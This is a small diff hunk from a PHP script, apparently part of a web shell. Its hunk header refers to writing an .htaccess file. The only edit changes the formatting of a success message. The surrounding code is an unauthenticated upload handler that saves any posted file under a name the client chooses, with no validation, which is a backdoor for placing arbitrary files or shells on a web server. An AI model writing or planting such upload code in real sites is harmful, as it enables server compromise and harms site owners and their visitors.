@@ -20,7 +20,7 @@ fclose($htaccess);
 <?php
 if($_POST['up']) {
     if(copy($_FILES['upd']['tmp_name'], $_FILES['upd']['name'])) {
-        echo "<br><br>".$_FILES['upd']['name']." Uploaded !!!";
+        echo "<br>".$_FILES['upd']['name']." Uploaded !!!";
     }
 }
 ?>
